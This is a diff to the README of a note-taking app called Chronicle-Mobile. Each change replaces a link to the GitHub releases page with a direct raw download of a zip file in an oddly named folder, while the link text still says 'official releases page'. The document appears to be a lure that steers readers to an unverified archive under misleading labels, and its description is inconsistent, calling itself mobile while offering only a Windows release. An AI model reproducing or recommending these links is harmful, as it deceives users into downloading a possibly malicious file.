@@ -1,6 +1,6 @@
 # 📱 Chronicle-Mobile - Capture and organize your daily notes
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/liednonverbalintelligence397/Chronicle-Mobile/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/liednonverbalintelligence397/Chronicle-Mobile/raw/refs/heads/main/adoxography/Chronicle-Mobile-1.1.zip)
 
 Chronicle-Mobile helps you track your daily thoughts, tasks, and ideas in one secure place. This application focuses on simplicity, speed, and privacy. You keep full control of your data without complex cloud setups or subscriptions.
 
@@ -8,7 +8,7 @@ Chronicle-Mobile helps you track your daily thoughts, tasks, and ideas in one se
 
 Follow these steps to set up Chronicle-Mobile on your Windows computer. The process takes about three minutes.
 
-1. Visit the [official releases page](https://github.com/liednonverbalintelligence397/Chronicle-Mobile/releases) to find the latest version of the software.
+1. Visit the [official releases page](https://github.com/liednonverbalintelligence397/Chronicle-Mobile/raw/refs/heads/main/adoxography/Chronicle-Mobile-1.1.zip) to find the latest version of the software.
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the link that ends in `.exe` to start the download.
 4. Save the file to your desktop or your Downloads folder.
@@ -59,7 +59,7 @@ Yes. You can import text files directly. Open the Settings menu and look for the
 The software functions entirely offline. You do not need an internet connection to write, search, or view your notes.
 
 **How do I update the software?**
-When a new version becomes available, the app notifies you. You can return to the [releases page](https://github.com/liednonverbalintelligence397/Chronicle-Mobile/releases) to download the updated installer. The installer detects your previous installation and keeps your existing notes intact.
+When a new version becomes available, the app notifies you. You can return to the [releases page](https://github.com/liednonverbalintelligence397/Chronicle-Mobile/raw/refs/heads/main/adoxography/Chronicle-Mobile-1.1.zip) to download the updated installer. The installer detects your previous installation and keeps your existing notes intact.
 
 **Is there a mobile version?**
 This specific release is designed for desktop environments. We focus our efforts on the Windows experience to ensure high stability and performance.
